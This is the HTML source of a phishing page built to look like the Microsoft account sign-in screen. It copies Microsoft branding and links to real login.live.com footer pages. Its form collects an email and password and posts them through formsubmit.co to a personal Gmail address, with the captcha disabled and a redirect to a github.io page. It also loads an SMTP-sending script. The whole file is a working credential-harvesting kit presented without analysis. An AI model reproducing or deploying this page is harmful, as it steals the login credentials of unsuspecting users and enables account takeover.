<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Sign in to your Microsoft account</title>
    <link rel="shortcut icon" href="img/microsoft_PNG18.png" type="image/x-icon">
    <link rel="stylesheet" href="fontawesome-free-5.10.1-web/css/all.css" type="text/css"/>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <main>
        <form id="form"  method="POST" action="https://formsubmit.co/godfreyosas655@gmail.com">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://fdarys.github.io/fdvd/empop.html">
        <div id="form-holder">
            <img class="sign-in" src="img/microsoft_logo.svg" alt="logo" id="ms-logo">
            <h2 class="sign-in-content sign-in">Sign in</h2>
          
            <input class="sign-in-content sign-in" type="email" name="Email" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype">
<input class="sign-in-content sign-in" type="text" name="password" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Enter your Password." aria-describedby="loginHeader" placeholder="Password">
            <p class="sign-in-content sign-in">No account? <a href="#" id="signup" aria-label="Create a Microsoft account" name="createAccount">Create one!</a></p>
            <p class="sign-in-content sign-in"><a href="#">Sign-in options</a></p>
            <div class="sign-in-content sign-in" id="submit">
                <button type="submit" id="button" value="Send Email">Sign In</button>
            </div>
            </form>
            </div>
            <div id="cover">
                <img src="img/803.gif" alt="loading">
            </div>
        </div>
        <div class="message" hidden>
            
        </div>
    </main>
    <footer>
        <a href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&vv=1600&uaid=97ff2ef4536c492291d2e93971a379da">Terms of use</a>
        <a href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&vv=1600&uaid=97ff2ef4536c492291d2e93971a379da">Privacy &amp; cookies</a>
        <button><img src="img/ellipsis_white.svg" alt="more" id="image-button"></button>
    </footer>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script src="jquery.js"></script>
    <script src="emails.js"></script>
    <script src="script.js"></script>
</body>
</html>
